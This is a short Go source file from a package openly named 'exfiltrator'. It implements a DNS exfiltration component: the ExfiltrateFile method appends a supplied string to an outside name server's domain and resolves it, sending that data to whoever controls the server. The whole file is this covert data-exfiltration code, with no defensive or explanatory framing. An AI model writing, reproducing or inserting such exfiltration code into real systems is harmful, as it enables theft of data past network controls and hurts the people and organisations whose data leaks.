package exfiltrator

import (
	"context"
	"log"
	"net"
)

type dnsExfiltrator struct {
	NameServer string
}

func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
	return &dnsExfiltrator{
		NameServer: nameServer,
	}
}

func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
	_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", filename+"."+ex.NameServer)
	if err != nil {
		log.Fatalln(err)
	}
}
